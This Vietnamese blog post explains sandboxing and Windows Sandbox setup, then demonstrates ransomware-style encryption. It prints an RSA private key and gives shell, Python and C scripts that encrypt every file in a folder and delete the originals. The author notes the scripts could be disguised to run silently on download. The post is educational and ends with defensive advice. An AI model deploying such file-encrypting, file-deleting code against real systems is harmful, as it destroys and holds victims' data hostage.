---
layout: post
title: "What Is a Sandbox Environment"
meta-title: "Sandbox Environment"
subtitle: "... What Is a Sandbox Environment"
bigimg:
  - "/img/2024-04-10-What-Is-a-Sandbox-Environment/banner.webp"
image: "/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled.png"
tags: [decrypt, encrypt, Sandbox, VirtualBox]
category: ngoai-luong
# gh-repo: bangnguyendev/Documents
# gh-badge: [star, watch, fork, follow]
comments: true
---
Trong thời đại công nghệ ngày nay, mối lo ngại về bảo mật ngày càng trở nên nghiêm trọng. Cả máy tính cá nhân và điện thoại di động đều dễ bị hacker xâm nhập nếu người dùng không cẩn thận khi duyệt web hoặc tải ứng dụng từ các nguồn không đáng tin cậy. Điều này tạo ra nguy cơ tiềm ẩn cho việc mất mát thông tin cá nhân, đặc biệt là thông tin tài khoản ngân hàng.

### Sandbox là gì?

Sandbox là một kỹ thuật cô lập các ứng dụng để bảo vệ máy tính hoặc điện thoại khỏi phần mềm độc hại và ngăn chúng xâm nhập và gây hỏng hóc hệ thống hoặc rò rỉ thông tin cá nhân.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled.png">
</div>

Trong máy tính, mỗi ứng dụng thường chia sẻ một không gian bộ nhớ và CPU chung. Điều này có thể dẫn đến việc một ứng dụng chiếm hết tài nguyên của hệ thống mà không có kiểm soát. Sandbox cô lập các ứng dụng trong một môi trường an toàn, ngăn chúng gây hại cho hệ thống.

### Tính Năng Nổi Bật của Sandbox

Sandbox đi kèm với các tính năng hữu ích sau:

- **Môi trường ảo hoàn chỉnh**: Cung cấp một môi trường ảo đầy đủ với tất cả các thông tin cần thiết, dễ dàng sử dụng như trên Windows.
- **Xoá dọn tự động**: Tự động xoá sạch mọi dữ liệu sau khi sử dụng, đảm bảo tuyệt đối về bảo mật thông tin.
- **Giao diện thân thiện**: Cung cấp giao diện dễ sử dụng, thân thiện với người dùng.
- **Hiệu suất cao**: Đạt hiệu suất cao, xử lý mượt mà, không gây gián đoạn trong quá trình sử dụng.

### Nếu không có sandbox, các chương trình có thể gặp phải các vấn đề sau:

1. **Xâm nhập từ phần mềm độc hại**: Thiếu cơ chế cô lập, chương trình có thể bị tấn công bởi phần mềm độc hại, dẫn đến lỗ hổng bảo mật và mất thông tin quan trọng.
2. **Xung đột tài nguyên**: Các chương trình chia sẻ tài nguyên hệ thống mà không có sự kiểm soát có thể gây ra xung đột, làm gián đoạn hoạt động của hệ thống.
3. **Lỗi bảo mật và lỗ hổng**: Thiếu cơ chế kiểm soát, chương trình có thể truy cập và thay đổi các dữ liệu nhạy cảm, tạo điều kiện cho hacker hoặc phần mềm độc hại.
4. **Lỗi hoạt động**: Không có sự cô lập, các lỗi hoạt động của một chương trình có thể ảnh hưởng đến toàn bộ hệ thống, gây ra sự cố và crash.
5. **Phân mảnh tài nguyên**: Sự phân mảnh tài nguyên hệ thống có thể xảy ra khi nhiều chương trình cùng sử dụng tài nguyên hệ thống mà không được quản lý.

#### Nhiễm các chương trình độc hại

Giả sử một tình huống, có một ứng dụng chia sẻ máy tính của bạn với tất cả các ứng dụng đang chạy khác, và một trong số các chương trình đó chứa thông tin nhạy cảm của bạn. Khi các ứng dụng không có sandbox, các ứng dụng độc hại tồn tại trên máy bạn sẽ luôn thăm dò các khu vực lưu thông tin bảo mật trên các ứng dụng đó, tìm ra các lỗ hổng của chương trình và đánh cắp thông tin nhạy cảm của bạn.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%202.png">
</div>

Sandbox sẽ là giải pháp hữu hiệu giải quyết các vấn đề đó. Nó cung cấp khả năng bảo vệ các chương trình và chống lại các chương trình độc hại. Khi một ứng dụng chạy trong sandbox, nó chỉ có thể truy cập vào các khu vực bộ nhớ đã được cấp phép cho nó. Vì vậy, việc mở các tài liệu nhạy cảm sẽ ngăn không cho các malware hay ứng dụng độc hại xâm nhập, vì tài liệu này không nằm cùng khu vực bộ nhớ với các chương trình độc hại đó.

### Một số nền tảng sử dụng sandbox

#### Sandbox trình duyệt

#### PDF, Microsoft Office

#### Ứng dụng Windows

- Máy ảo

Một trong những Ứng dụng máy ảo nổi tiếng hiện nay **là VirtualBox**, có thể chạy máy ảo trên cả **Windows** lẫn macOS hay kể **cả Linux**. Các chương trình máy ảo sẽ giúp tạo ra một môi trường phần cứng ảo và chạy riêng một hệ điều hành. Hệ điều hành mới này sẽ tách biệt hoàn toàn với máy tính của bạn, tất cả các ứng dụng chạy trong máy ảo sẽ không được phép truy cập vào bất kỳ đâu bên ngoài máy ảo, nhờ vậy sẽ bảo vệ hệ thống thật của bạn trước các phần mềm không đảm bảo.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%203.png">
</div>


- Windows Sandbox

Windows Sandbox là một môi trường ảo hoá của Microsoft, ngay bên trong Windows hay gọi vui là chạy máy ảo Windows trong chính Windows. Sandbox là một công cụ để test app, kiểm thử các phần mềm để tránh các rủi ro về malware, virus hay spyware xâm nhập vào máy tính của mình. Sandbox hoạt động như một môi trường riêng biệt so với Windows chính mà người dùng đang sử dụng, sau khi đóng Sandbox thì mọi thứ đã cài đặt, đã kiểm tra cũng sẽ biến mất mà không để lại bất kì dấu vết nào.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2013.png">
</div>

### Cách kích hoạt sandbox trên Windows 10

#### Điều kiện để chạy sandbox trên Windows 10

Máy tính bạn phải đạt được yêu cầu cấu hình tối thiểu sau:

- Máy tính của bán sử dụng hệ điều hành **Windows 10 Pro hoặc Enterprise Insider**, phiên bản build từ 18305 trở lên.
- Kiến trúc chip x86-64 (hay còn gọi là AMD64).
- **CPU hỗ trợ khả năng ảo hóa.**
- Phải có tối tiểu 4GB RAM (8GB theo khuyến nghị).
- Tối thiểu 1GB dung lượng ổ đĩa trống (ổ cứng SSD là tốt nhất).
- CPU tối thiểu 2 lõi (4 lõi với siêu phân luồng).

**Bước 1**: Nhấp chuột phải vào thanh taskbar > Chọn **Task Manager**.

**Bước 2**: Trong cửa sổ **Task Manager** > Chọn tab **Performance**.

Tại đây, hãy kiểm tra dòng **Virtualization**, nếu **Enable** tức CPU của bạn có hỗ trợ chức năng ảo hóa.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%204.png">
</div>

#### Cách kích hoạt Sandbox Windows 10

**Bước 1**: Kích hoạt tính năng Sandbox Windows 10

Nhấn **Windows + S** > Gõ vào thanh tìm kiếm **Turn Windows features on or off** và chọn ứng dụng như hình.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%205.png">
</div>

Tìm đến 3 tính năng là **Virtual Machine Platform**, **Windows Hypervisor Platform** và **Windows Sandbox**, bật cả 3 lên và **restart** máy là xong.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%206.png">
</div>

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%207.png">
</div>

Khởi động lại máy tính

**Bước 2**: Mở Sandbox trên Windows 10

Nhấn **Windows + S** > Gõ **Windows Sandbox** > Nhấn vào **Windows Sandbox** để mở.

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%208.png">
</div>

Sử dụng Sandbox:
- Khi nghi ngờ về một tệp tin được tải từ mạng hoặc email, bạn có thể sử dụng Sandbox để mở và kiểm tra tệp tin đó.

- Sandbox là một công cụ để test app, kiểm thử các phần mềm để tránh các rủi ro về malware, virus hay spyware xâm nhập vào máy tính của mình.


Ví dụ, trường hợp tôi cài đặt một phần mềm Git với một đường dẫn [git-scm.com/downloads](https://git-scm.com/downloads) và tôi nghi nó không an toàn:

- Tôi sử dụng Sandbox, mở trình duyệt và truy cập trang web [git-scm.com/downloads](https://git-scm.com/downloads) mà tôi cho là không an toàn (tôi thử nghiệm thôi nhé - chứ trang này an toàn)

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%209.png">
    <br>
    Trong Sandbox chưa có Git
</div>

- Tải file *.exe và cài đặt trong môi trường Sandbox
<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2010.png">
    <br>
    Tải và cài đặt trong môi trường Sandbox
</div>

- Sau khi cài đặt xong, phần mềm đã được cài đặt và chúng ta thấy nó hoạt động bình thường và không phải là một mối đe doạ.
<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2011.png">
    <br>
    Đúng là file cài đặt chuẩn vì không có chuyện gì xảy ra
</div>

- Khi hoàn tất việc thử nghiệm thì chúng ta tắt Sandbox, sẽ có một thông báo được hiện ra, báo răng mọi thay đổi trong Sandbox từ nãy giờ sẽ bị xóa bỏ hoàn toàn.
<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2012.png">
</div>

- Sau khi đóng Sandbox thì mọi thứ đã cài đặt, đã kiểm tra cũng sẽ biến mất mà không để lại bất kì dấu vết nào.
<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2013.png">
    <br>
    Xóa sạch mọi cài đặt, mới tinh tươi
</div>


### Nói về mã hoá tệp tin

{: .box-error}
**Lưu ý:** Những script dưới đây mang tính chất demo, không sử dụng trong mục đích khác!

#### RSA

RSA là một thuật toán mã hóa không đối xứng được sử dụng rộng rãi trên internet với HTTPS. Nó cho phép mã hóa dữ liệu bằng một khóa và chỉ có thể giải mã bằng khóa còn lại trong cặp khóa. Điều này hữu ích khi cần mã hóa dữ liệu giữa nhiều bên khác nhau và chỉ cần tồn tại một cặp khóa cho mỗi bên. Để tạo cặp khóa, người dùng chọn độ dài bit và thực hiện tạo khóa, nhưng thời gian tạo khóa có thể lâu tùy thuộc vào độ dài bit được chọn.

#### Tạo Khóa Riêng
Chạy lệnh này để tạo một khóa riêng 4096-bit và xuất nó ra tệp `private.pem`. Nếu bạn muốn, bạn có thể thay đổi độ dài khóa và/hoặc tệp xuất.

```bash
$ openssl genrsa 
```

#### Tính Toán Khóa Công Khai
Với một khóa riêng, bạn có thể tính toán được khóa công khai của nó và xuất ra tệp `public.pem` bằng lệnh này. (Bạn cũng có thể dán khóa riêng được tạo bởi OpenSSL vào biểu mẫu ở trên để nhận được khóa công khai của nó.)

```bash
$ openssl rsa -in private.pem -pubout -out public.pem
```

#### Mã Hóa Dữ Liệu
Bây giờ chúng ta có thể sử dụng cặp khóa này để mã hóa và giải mã một tệp, `data.txt`.

```bash
$ openssl rsautl -encrypt -inkey public.pem -pubin -in data.txt -out data.txt.enc
```

#### Giải Mã Dữ Liệu
Với tệp đã được mã hóa từ bước trước, bạn có thể giải mã như sau.

```bash
$ openssl rsautl -decrypt -inkey private.pem -in data.txt.enc -out data.txt
```

Dựa vào **openssl** tôi đã tạo được cặp khóa **PRIVATE/PUBLIC KEY** như dưới đây:
##### PRIVATE KEY private.pem

```bash
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDP8H2P+a6L5e/m
GNcmd5Xo+33V8XoYmdmQ9vlzv9K0PfoaLdR7Fr8AvXschoJouKmDsxyOV09UX3bb
UubQKnCUEDf6Q7HBtUx4GH5TDk9B7JQVF4y0s1DxEa9awf3ZEi0DUt2yMD5LrPus
jv31gDQI8NJhLFEm28DkB+Sax4hmxtqRgf/x7U5w0oYeKqpmzCczdAZ1v4FnKpyF
z0+uzAhI4zZAaVfsnqXQywqXgb+pj/9qRV64j0kDGgx1gg9Wfra8QEHsINg5CE/X
S4fsRB1Rap9vqd+mQyUGKLbQzFZyRmGTJsX0yVourNYKWHGOx6rfSXVgzbWTES+J
PVY+lQ1rAgMBAAECggEASv2NGuZNx5A2M0JUHUBVZP+FwyliAgtCBmC7V74fK/eK
AfTzQyzR119+TaxIzaGDKMbojoD4UBJZmAFO0lXr4cnzliLhsV1D5a/XpvZrKPg7
81tZ2DUvBLF/DvkVJjrC1wcEguWZIcuRvAqZlfcVTQAkrvy/i4cHCnW6QQOisoVv
P4nzSrpst8BdcKhkGjLBNaZAF+g044Is+9KA20ixDeg1pZwYmHGAhZosTqoxWMz1
ofk2pl6ZceLLnfJmqBfnERvmUsDWBFdPHF6sx/e1krg7Xu3UrUtseeUWVDqMMoCu
WF2/BdmF3fH0mUiyQsJG4EEn8UYy2Ve1xl8P2X9WgQKBgQD/BcJtLQO+mHsc6tiV
oaLm89QwQJjivIGGW//FsFZOm3uxu/6rd81MLQSaPxa7risDisdVFiRFsvlCJbnc
KR8nWaUdcf2OOnLwTawnaGHAoFEs6bCj0TYinirYSrLTAXvIKG+tg8qRV8A1U8Nd
PF+IcS9LNn08+V4OcDKzYt/9KwKBgQDQvIfhT6TXuyvugI+mPX/dfoy+aMqsnt1J
31bvWHwGh8t/Cdy8ofC33yq/1reuFtD1FRwBu2dBpztHRrdJGv9HMZ2xqwdu5SXZ
J+z7eRR74a4pUrIQnRV7ZngcI+SLFkZWujo83yqRbpDWL2oHjr4eOMSghq7VNror
HbCivm2QwQKBgQDdRgIM+KHnHia0UJDcRAM0oRvbQjFlimpYSjsDLJ22VvJcpOGz
pZ9cGTOFInh3IAfyatfJ3Axc7Y2Y92LsxEFjw0Sg5+c5IT3Zg4t8JfWrTW8hqSK7
ASwXnWVPhoDi1MayRWOhClkZAyqjGqrImznJCWwftoe0ACq8HF3hiEkRQQKBgC7R
2vii0KrDBPueQppbOQ8Jj7A1+R/3ElO7kNhm1IrycqawI578A+56VDBrjQ+zdnNC
pOGOk36acCVwqzPupkvlySVM44HwTCkFV5agdgPDfzktn1syoNrpBQ/qzRyVhnl1
lBKLTBUK49nnELVZQzOsMA6Bpz2T5PY+1pvqctEBAoGBAOd1APkitLy+4jDpvF2L
4fpcylOZ1S6btE6mz6K7xY5E/OobudsrGEvwrMTVGGoEjGKGfraRExCyznK5rkr+
vt3SFBtd0J9urGGRpCneT3hf76XY7Wz/kvRY8A3wm+v+GYaD1lU5R/PEYLZsv6HI
9bf3aMFcz4ETJt8J0ao0rBoG
-----END PRIVATE KEY-----

```
##### PUBLIC KEY public.pem
```bash
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz/B9j/mui+Xv5hjXJneV
6Pt91fF6GJnZkPb5c7/StD36Gi3Uexa/AL17HIaCaLipg7McjldPVF9221Lm0Cpw
lBA3+kOxwbVMeBh+Uw5PQeyUFReMtLNQ8RGvWsH92RItA1LdsjA+S6z7rI799YA0
CPDSYSxRJtvA5AfkmseIZsbakYH/8e1OcNKGHiqqZswnM3QGdb+BZyqchc9PrswI
SOM2QGlX7J6l0MsKl4G/qY//akVeuI9JAxoMdYIPVn62vEBB7CDYOQhP10uH7EQd
UWqfb6nfpkMlBii20MxWckZhkybF9MlaLqzWClhxjseq30l1YM21kxEviT1WPpUN
awIDAQAB
-----END PUBLIC KEY-----

```

{: .box-note}
**Note:** Tôi tạo những script dưới đây để thực hiện demo của mình!

#### Script encrypt - mã hóa dữ liệu

> *Giả sử đoạn script đã được ngụy trang bên trong một lớp vỏ bọc hoàn hảo và bạn đã tải về máy tính của bạn! Và bạn không ngần ngại thực thi file cài đặt này! Hoặc nó tự động active :)) Và Bùmmm!!!*

```sh
### encrypt.sh
for i in `find . -type f ! \( -name "public.pem" -o -name "encrypt.sh" \)` ;
do 	
	echo ">>>encrypt $i";	
	openssl pkeyutl -encrypt -inkey public.pem -pubin -in $i -out $i.enc;	
	echo remove $i;	rm -rf $i;
done
```

-  Đặt script **encrypt.sh** và **public.pem** trong thư mục chứa 10 tệp tin *.txt mô phỏng data

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/encrypt_demo_1.png">
    <br>
    Cấu trúc thư mục và nội dung tệp dữ liệu
</div>

-  Thực thi đoạn script mã hóa dữ liệu và xóa các tệp hiện có trong thư mục (ngoại trừ 2 file public.pem và encrypt.sh)

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/encrypt_demo_2.png">
    <br>
    Thực thi đoạn script - Thông tin trong tệp tin đã bị mã hóa
</div>

{: .box-warning}
**Warning:** Thực tế ở trường hợp này, hacker có thể cho xóa **"public.pem"** (tuy không còn quan trọng vì mã hóa bất đối xứng) và **"encrypt.sh"** sau khi thực thi tệp và tạo thêm một tệp thông tin tống tiền, đồng thời cho phát tán các mã độc khác đi khắp mạng máy tính trong nhà.

#### Script decrypt - giải mã dữ liệu

```sh
## decrypt.sh
for i in `find . -type f ! \( -name "private.pem" -o -name "decrypt.sh" \)`  
do
	echo ">>>decrypt $i"
	openssl pkeyutl -decrypt -inkey private.pem -in $i -out $i.txt
done
```

- Đặt script **decrypt.sh** và **private.pem** trong thư mục chứa 10 tệp tin đã bị mã hóa

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/decrypt_demo_1.png">
    <br>
    Thực thi đoạn script - Thông tin trong tệp tin đã được giải mã
</div>

{: .box-warning}
**Warning:** Thực tế ở trường hợp này, **private.pem** là một **mã key rất phức tạp** được hacker nắm giữ và **phương thức mã hóa** không còn sử dụng **openssl** và gần như khó có thể giải mã ra được! Ngoại trừ một lí do duy nhất thỏa mãn điều kiện của chúng!!!

{: .box-note}
**Note:** Ví dụ này, việc **hack vào một hệ thống trái phép** gồm các quy trình phức tạp và **phạm pháp**, bài viết **giúp** cho **người đọc thấy được việc data bị mã hóa** sẽ trông như thế nào!

#### Script encrypt Python - mã hóa dữ liệu

> Đoạn mã Python dưới đây dược sử dụng để mã hóa dữ liệu được tôi chuyển đổi từ script **encrypt.sh** phía trên, nó có thể được đóng gói thành file *.exe và cài đặt thực thi ngầm khi bạn tải về!

```python
import os
import subprocess

# Nội dung của tệp public.pem
public_pem = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz/B9j/mui+Xv5hjXJneV
6Pt91fF6GJnZkPb5c7/StD36Gi3Uexa/AL17HIaCaLipg7McjldPVF9221Lm0Cpw
lBA3+kOxwbVMeBh+Uw5PQeyUFReMtLNQ8RGvWsH92RItA1LdsjA+S6z7rI799YA0
CPDSYSxRJtvA5AfkmseIZsbakYH/8e1OcNKGHiqqZswnM3QGdb+BZyqchc9PrswI
SOM2QGlX7J6l0MsKl4G/qY//akVeuI9JAxoMdYIPVn62vEBB7CDYOQhP10uH7EQd
UWqfb6nfpkMlBii20MxWckZhkybF9MlaLqzWClhxjseq30l1YM21kxEviT1WPpUN
awIDAQAB
-----END PUBLIC KEY-----
"""

# Tạo một tệp tạm thời chứa khóa công khai
with open("temp_public.pem", "w") as f:
    f.write(public_pem)

# Tìm tất cả các tệp trong thư mục hiện tại trừ private.pem, public.pem và test.sh
files = [f for f in os.listdir('.') if os.path.isfile(f) and f not in [ "test.py", "temp_public.pem"]]

# Lặp qua từng tệp và mã hóa, sau đó xóa
for file in files:
    print(">>> Encrypting", file)
    subprocess.run(["openssl", "pkeyutl", "-encrypt", "-inkey", "temp_public.pem", "-pubin", "-in", file, "-out", file + ".enc"])
    print("Removing", file)
    os.remove(file)

# Xóa tệp tạm thời
os.remove("temp_public.pem")

```

#### Script encrypt C-lang - mã hóa dữ liệu

> Đoạn mã C-lang dưới đây dược sử dụng để mã hóa dữ liệu được tôi chuyển đổi từ script **encrypt.sh** phía trên, nó có thể được đóng gói thành file linux và cài đặt thực thi ngầm khi bạn tải về!

```c
// main.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char public_pem[] = "-----BEGIN PUBLIC KEY-----\n"
                        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz/B9j/mui+Xv5hjXJneV\n"
                        "6Pt91fF6GJnZkPb5c7/StD36Gi3Uexa/AL17HIaCaLipg7McjldPVF9221Lm0Cpw\n"
                        "lBA3+kOxwbVMeBh+Uw5PQeyUFReMtLNQ8RGvWsH92RItA1LdsjA+S6z7rI799YA0\n"
                        "CPDSYSxRJtvA5AfkmseIZsbakYH/8e1OcNKGHiqqZswnM3QGdb+BZyqchc9PrswI\n"
                        "SOM2QGlX7J6l0MsKl4G/qY//akVeuI9JAxoMdYIPVn62vEBB7CDYOQhP10uH7EQd\n"
                        "UWqfb6nfpkMlBii20MxWckZhkybF9MlaLqzWClhxjseq30l1YM21kxEviT1WPpUN\n"
                        "awIDAQAB\n"
                        "-----END PUBLIC KEY-----\n";

    // Tạo một tệp tạm thời chứa khóa công khai
    FILE *temp_public_file = fopen("temp_public.pem", "w");
    if (temp_public_file == NULL) {
        perror("Không thể tạo tệp tạm thời");
        return 1;
    }
    fputs(public_pem, temp_public_file);
    fclose(temp_public_file);

    // Tìm tất cả các tệp trong thư mục hiện tại trừ private.pem, public.pem và test.sh
    system("ls | grep -vE 'private.pem|public.pem|test.sh' > filelist.txt");

    // Mở filelist.txt để đọc danh sách các file
    FILE *filelist_file = fopen("filelist.txt", "r");
    if (filelist_file == NULL) {
        perror("Không thể mở filelist.txt");
        return 1;
    }

    char file_name[256];
    // Lặp qua từng file trong danh sách
    while (fgets(file_name, sizeof(file_name), filelist_file) != NULL) {
        // Loại bỏ ký tự xuống dòng
        strtok(file_name, "\n");

        // Mã hóa file và xóa file gốc
        printf(">>> Encrypting %s\n", file_name);
        char command[512];
        sprintf(command, "openssl pkeyutl -encrypt -inkey temp_public.pem -pubin -in %s -out %s.enc", file_name, file_name);
        system(command);

        printf("Removing %s\n", file_name);
        remove(file_name);
    }

    // Đóng filelist.txt
    fclose(filelist_file);

    // Xóa tệp tạm thời
    remove("temp_public.pem");
    remove("filelist.txt");

    return 0;
}

```

##### gcc biên dịch main.c thành file encryptencrypt_file

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2014.png">
    <br>
    gcc biên dịch main.c thành file encryptencrypt_file
</div>

##### Đọc dữ liệu bên trong các tệp data mô phỏng

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2015.png">
    Đọc dữ liệu bên trong các tệp data mô phỏng
</div>

##### Thực thi script mã hóa dữ liệu

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2016.png">
    <br>
    Thực thi script mã hóa dữ liệu
</div>

##### Kết quả mã hóa dữ liệu

<div class="post-img-post">
    <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2017.png">
    <br>
    Kết quả mã hóa dữ liệu
</div>

### Lời Khuyên Để Tránh Bị Tin Tặc Mã Hóa Dữ Liệu

1. **Sử Dụng Phần Mềm An Toàn**: Luôn sử dụng phần mềm mã hóa dữ liệu từ nguồn tin cậy và đã được kiểm định. Hãy chọn các công cụ mã hóa dữ liệu đã được phê duyệt và được sử dụng rộng rãi trong cộng đồng.

2. **Cập Nhật Phần Mềm**: Đảm bảo bạn luôn cập nhật phần mềm mã hóa dữ liệu của mình đến phiên bản mới nhất để bảo vệ khỏi các lỗ hổng bảo mật đã biết.

3. **Sử Dụng Mật Khẩu Mạnh Mẽ**: Sử dụng mật khẩu mạnh mẽ và độc đáo cho các tài khoản của bạn. Hãy tránh sử dụng mật khẩu dễ đoán hoặc dễ bị đoán được.

4. **Sao Lưu Dữ Liệu Thường Xuyên**: Luôn sao lưu dữ liệu của bạn và giữ chúng tách biệt khỏi máy tính hoặc thiết bị chính. Điều này giúp bạn phục hồi dữ liệu nếu bị mất hoặc bị tấn công.

5. **Kiểm Tra Tính Hợp Lệ của Địa Chỉ Website**: Khi truy cập các trang web nhạy cảm như trang ngân hàng hoặc trang web chia sẻ thông tin cá nhân, luôn kiểm tra tính hợp lệ của địa chỉ website để tránh rơi vào các trang web giả mạo.

6. **Kiểm Tra Email Cẩn Thận**: Tránh bấm vào các liên kết hoặc mở tệp đính kèm từ các email không mong đợi hoặc không xác đáng. Cẩn thận với các email lừa đảo hoặc phishing có thể dẫn đến việc tiết lộ thông tin cá nhân hoặc bị tấn công.

7. **Giữ Bản Đồn Địa Chỉ của Bạn Riêng Tư**: Tránh chia sẻ chi tiết địa chỉ, thông tin tài khoản hoặc thông tin cá nhân quá nhiều trên mạng xã hội hoặc các diễn đàn công cộng.

Nhớ rằng, việc bảo vệ dữ liệu của bạn là trách nhiệm cá nhân của bạn. Luôn giữ tinh thần cảnh giác và thực hiện các biện pháp an toàn cơ bản để bảo vệ mình trước mối đe dọa từ tin tặc.
